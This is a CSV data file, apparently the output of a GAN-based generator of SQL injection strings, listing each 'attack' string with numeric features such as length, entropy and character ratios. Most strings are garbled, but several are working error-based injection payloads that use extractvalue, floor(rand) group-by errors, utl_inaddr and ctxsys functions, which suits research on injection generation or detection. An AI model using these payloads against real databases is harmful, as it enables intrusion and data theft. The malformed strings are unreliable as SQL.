attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"""ada where 1t_  (  6237  SELECT by x  FROMauit union 1 (  >        FROM   1 3931chruaCna  (  (  5023  4232  ,i  *2having   me 8488 select 0 when  )     select )    select 1 6825 1210  thenend   (   then concatconcat  (  )  )  ,a   )   SELECT union RDINNNASwhereIST union 1210  )    select || 1x  0x4b774c75l DSTINSC.T  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415,323.0,53.0,4.512513766203065,151.0,48.0,103.0,21.0,0.4674922600619195,0.14860681114551083,0.3188854489164087,0.06501547987616099,0.0,1.0,0.0,0.0,1.0,0.0,0.0,12.0,0.0,1.0,2.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,6.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,-M5023  having ) information_schemauinialtnwt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416,45.0,26.0,4.381316019639962,34.0,4.0,4.0,3.0,0.7555555555555555,0.08888888888888889,0.08888888888888889,0.06666666666666667,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'zc_sju",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417,303.0,40.0,4.036869006559383,106.0,55.0,109.0,33.0,0.34983498349834985,0.18151815181518152,0.35973597359735976,0.10891089108910891,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,1.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"17319xx NAONC"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""E0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418,353.0,40.0,3.8305498767842865,102.0,58.0,137.0,56.0,0.28895184135977336,0.1643059490084986,0.3881019830028329,0.15864022662889518,0.0,2.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""4510hx.R=ljhrcfloorounq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419,576.0,41.0,3.837523604930763,170.0,89.0,232.0,85.0,0.2951388888888889,0.1545138888888889,0.4027777777777778,0.14756944444444445,0.0,4.0,0.0,0.0,0.0,4.0,0.0,46.0,2.0,0.0,6.0,24.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1 union' like 'UNTGANCT 5192a0x717a767a71x DINUT Sunionselect 8488 union 4493  ,0x717a767a71,0x78   SELECTE(  select from  dy  addrt_os 0)   FROM   (  case,7469   where 1- E  ||cr  *rr  (  ,  0 6825chr  (  =  )   )    )  having   )    )  (  )   from         from  union or xT select  rand  ||ch  (  a_'  =  'agaTr7810 || information_schemar.tre",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420,344.0,57.0,4.623567255529276,157.0,49.0,103.0,35.0,0.4563953488372093,0.14244186046511628,0.29941860465116277,0.10174418604651163,4.0,0.0,1.0,0.0,1.0,2.0,0.0,13.0,0.0,3.0,4.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,3.0,1.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"-rand  *   ,  >  118  )      and      )  5023  )  3440  4386  ||c  )    )     )   )    2 or  1 x AISTIT  (   select end  (  ,1   then byui 5023  )     ,  case 0 DEI.cfTNE  ||  end  ) l  )     )    )   thenc  ,0x717a767a71,  when   and FROM chr  (  9173,  )  select a 1 else 0 5192 T 3785 or when union(  case concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421,317.0,48.0,3.9078333339198057,105.0,46.0,135.0,31.0,0.3312302839116719,0.14511041009463724,0.42586750788643535,0.09779179810725552,0.0,0.0,1.0,0.0,1.0,0.0,0.0,17.0,0.0,0.0,6.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"gun(,  ||  (  ,  casem  =  ||chr  (  select 5584  1  (  )  select 1 concat  )  f  case)   (  )  )  ()   ,concat   information_schema.  =  =  )   (  chrrvhtr   information_schema union,  aunax.choj.tbyss   8382unb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422,212.0,34.0,4.068073434894666,104.0,10.0,68.0,30.0,0.49056603773584906,0.04716981132075472,0.32075471698113206,0.14150943396226415,0.0,0.0,0.0,0.0,0.0,3.0,0.0,14.0,0.0,2.0,4.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423,235.0,34.0,3.941845153574428,81.0,45.0,83.0,26.0,0.3446808510638298,0.19148936170212766,0.35319148936170214,0.11063829787234042,2.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,1.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""%"" like ""cchoowu4106  ||r  (  113,0x717a767a71       ),  select   --,floor  ||c_adrlar.g   x.  (  (  0  )    then 0 1 else by 1392 or FROM   (  (  ||chr  (  (  select from 4386  auau   )  ,concat  6055  = and 1 x concat  )   then 1 information_schema  *2 or union (  ||c    =  *2   ,0x717a767a71,  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424,305.0,47.0,4.318484755581568,116.0,45.0,101.0,43.0,0.380327868852459,0.14754098360655737,0.33114754098360655,0.14098360655737704,0.0,3.0,4.0,0.0,2.0,2.0,0.0,13.0,1.0,2.0,6.0,16.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '4822I.g 1(  2 else m, SIrNRounuestdr.(  (  ||ychrhr  (  ,0x717a767a71  ||chr  (  select when   (  ,n information_schema  0 0x717a767a71,floor  t  (  case LL' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'M else byx INSNCntr_rosad.ua  (  case RT 1 by a x 0 end  from or or by concat  0  )    ,concat  (concat  6055  ||  (  (  *,floor  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425,765.0,51.0,4.17144996526152,286.0,121.0,271.0,87.0,0.3738562091503268,0.15816993464052287,0.3542483660130719,0.11372549019607843,4.0,0.0,0.0,0.0,3.0,3.0,0.0,48.0,0.0,2.0,17.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,0.0,2.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"11%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  """"  --.(  ,floor  (  =  )   or 3931 FROM x end  )   then when  (  ||chr  (  4493  ||chr  hrr  (  benchmark  select else AND union R ,  ||chq  112  #,1  )   x   4232  0 andrhr  (  ||chr  (  SELECT information_schemar  (  ||chr  6237,concat  =  ||chr  (  4493  ||chr  (  =  =  || 1 by from dxtsddr.s",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426,526.0,57.0,4.189238221156944,195.0,64.0,196.0,71.0,0.37072243346007605,0.12167300380228137,0.3726235741444867,0.13498098859315588,0.0,3.0,2.0,0.0,0.0,5.0,0.0,31.0,1.0,1.0,9.0,23.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1'   ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427,5.0,3.0,1.3709505944546687,0.0,1.0,3.0,1.0,0.0,0.2,0.6,0.2,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'a'   (  0  axOrouiinadztqakv_.r  (  (  )  select RA  ||chr  (  4232  0  ) select 90671   (  ||chrounerodrana WHEREIweriesa s unionr  =  and 6055  )     )   from )  )  9325  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428,357.0,47.0,3.999073054671851,116.0,54.0,141.0,46.0,0.32492997198879553,0.15126050420168066,0.3949579831932773,0.12885154061624648,3.0,0.0,2.0,0.0,0.0,2.0,0.0,28.0,0.0,1.0,5.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"11""",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429,3.0,2.0,0.9182958340544896,0.0,2.0,0.0,1.0,0.0,0.6666666666666666,0.0,0.3333333333333333,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430,9.0,5.0,2.0588138903312014,0.0,0.0,4.0,5.0,0.0,0.0,0.4444444444444444,0.5555555555555556,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-%et_  (  0x7171706a71||chou,  0  )    6055  9325  a G 6082  (  4232  =  )   from 4493 m   )    e when0x78 union1 else from R  (  || unionu  select else group union (  ||ch rNRsgroupeselect(  ||es else FROM 1      )   ,concat  )  (  ,  select 1   and  #iv,0x717a767a71,concat  =  = when elsea    elseselect T  (   and tujhrhrgo.syeu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431,332.0,50.0,4.409600323762026,151.0,46.0,102.0,33.0,0.45481927710843373,0.13855421686746988,0.3072289156626506,0.09939759036144578,0.0,0.0,1.0,0.0,0.0,3.0,0.0,12.0,1.0,1.0,5.0,12.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"-6236   112    )     ||chr   x  )    )     and  )     4232,floor  (  ||chr  (  #  (  ||chuieasyjysan_adroyr_rinesas groupc  )  (    ,0x717a767a71,1   then1  when when I  || end  )  case C m concat  (  5023  )  ||chr  (  =  ||chr  (  select from 0 44930x717a767a71  )   then 1 3051 1 1 5192INLIAT  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432,300.0,45.0,4.185623160209029,107.0,51.0,106.0,36.0,0.3566666666666667,0.17,0.35333333333333333,0.12,0.0,0.0,1.0,0.0,0.0,2.0,0.0,15.0,0.0,2.0,3.0,15.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-48221392r0||0  =u  ,0x717a767a71,1   SELECT 122hhrr  tr  (  (  #i  ,  || else 0 groupand 0 1  )   '  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'end  and when      ||chr  ant  6237,  (  =  0  or2131 6055alt  0   (  ||chr   or (  case end from when  (  ||cadxdr  (  (  6237  )     ||IMIITE  FROMet_auas  (  SELECT when dx.  (  ||chahr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433,490.0,52.0,4.233489091982957,179.0,80.0,173.0,58.0,0.3653061224489796,0.16326530612244897,0.35306122448979593,0.11836734693877551,2.0,0.0,1.0,0.0,0.0,3.0,0.0,26.0,0.0,1.0,9.0,18.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'tzw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434,263.0,38.0,4.033064783226906,103.0,35.0,93.0,32.0,0.3916349809885932,0.13307984790874525,0.35361216730038025,0.12167300380228137,2.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,1.0,2.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%&ert  (       (  )  )    (  ||r  u,hr  x  (  =  )   6055  )   )    (  )  || duadr. dr  5023  (   then3931 FROMua select 3931 group end   )     )  )   from ||xE  =  >  ||,r  (  rand  ||chr  (  (  *,concat  =  1392_rhr  (  =  4232  =  (  ,Sconcat  e   (  e  ||r  (     )    having   select GFROM 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435,297.0,46.0,3.761052308607655,89.0,26.0,132.0,50.0,0.2996632996632997,0.08754208754208755,0.4444444444444444,0.16835016835016836,0.0,0.0,0.0,0.0,1.0,5.0,0.0,23.0,1.0,1.0,4.0,20.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%concat  having DIESEE by D end   orSAIySTSTS. end  ||chr  (  1  ,concat  (  ,     )  =  )  )    (  00x717a767a71)   )  ||coudr.seysa (  =  then RAM end  113  u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436,161.0,38.0,4.185770336997816,71.0,15.0,55.0,20.0,0.4409937888198758,0.09316770186335403,0.3416149068322981,0.12422360248447205,0.0,0.0,0.0,0.0,0.0,2.0,0.0,9.0,1.0,0.0,2.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"oN%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437,10.0,6.0,2.321928094887362,2.0,0.0,4.0,4.0,0.2,0.0,0.4,0.4,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select 'ru_towt_zz""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438,34.0,18.0,3.7555742378637427,14.0,1.0,9.0,10.0,0.4117647058823529,0.029411764705882353,0.2647058823529412,0.29411764705882354,2.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack," ' SELECT Rs else or 9067 then 1 DT  (  select 'i'  =  ||r.(  case  )  ||chr  (  )  ,concat  (  (    *2 3051   )    havingOr  (  ||chr  (  =  ||c  (  )2   xITr  euT  select AIExNTet_nal  =  uinin0x7171706a71,0x78   )    ||chhrhr  (  ||chr  select 'i'  0  )   )    ,  )  )   0 or select FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439,290.0,47.0,4.119534958280794,113.0,26.0,107.0,44.0,0.3896551724137931,0.0896551724137931,0.3689655172413793,0.15172413793103448,5.0,0.0,0.0,0.0,1.0,3.0,0.0,18.0,0.0,1.0,3.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1'||  (  select 'a   ' like 'fromes.c  (  =  || me  aT  0x7171706a71m   or LIIINcz5996  ||s 3112  select WHERE union and and union thenu 2131 0   from p mn whena ANT  (  )  (  ||IINNCT.g.s.ch  =  =  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440,199.0,46.0,4.508551480672833,92.0,24.0,59.0,24.0,0.4623115577889447,0.12060301507537688,0.2964824120603015,0.12060301507537688,4.0,0.0,0.0,0.0,0.0,3.0,0.0,5.0,0.0,0.0,0.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"15606   )    from ,x 1 6825 when  (  ||chs.s      (  >  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441,58.0,25.0,3.5329587150149586,13.0,10.0,25.0,10.0,0.22413793103448276,0.1724137931034483,0.43103448275862066,0.1724137931034483,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,-WHERE2131unions from     AM chr  (  113  case L  0 O1NST 4493,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442,62.0,32.0,4.253822471635877,29.0,13.0,18.0,2.0,0.46774193548387094,0.20967741935483872,0.2903225806451613,0.03225806451612903,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"15483t_r  0x7171706a71randcoua_r  select or 1 7158 or else t_r   (  ||chor.t  =  =,  =hro",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443,89.0,28.0,4.18374161253709,37.0,20.0,21.0,11.0,0.4157303370786517,0.2247191011235955,0.23595505617977527,0.12359550561797752,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,3.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'a   select),1 - 1 FROMauads.trr   (  ||chr  (  case concat  '   case 0cE(  )   tysssy(  chge   tr  (  122  )     0x717a767a71   )     then select else when  (  ) SELECT or  6913  112  ,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444,187.0,40.0,4.030416034153385,79.0,23.0,66.0,19.0,0.42245989304812837,0.12299465240641712,0.35294117647058826,0.10160427807486631,2.0,0.0,1.0,0.0,0.0,0.0,0.0,11.0,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
